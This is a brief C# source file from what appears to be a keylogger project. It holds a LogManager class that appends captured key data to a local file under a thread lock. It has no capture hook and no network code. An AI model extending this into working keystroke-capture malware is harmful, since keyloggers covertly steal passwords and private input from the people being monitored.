using System.IO;

namespace keylogger
{
    public class LogManager
    {
        private readonly string _logFilePath;
        private static readonly object _lock = new object();
        public LogManager(string logFileName)
        {
            _logFilePath = Path.Combine(Directory.GetCurrentDirectory(), logFileName);
        }
        public void LogKey(string keyData)
        {
            lock (_lock)
            {
                File.AppendAllText(_logFilePath, keyData);
            }
        }
    }
}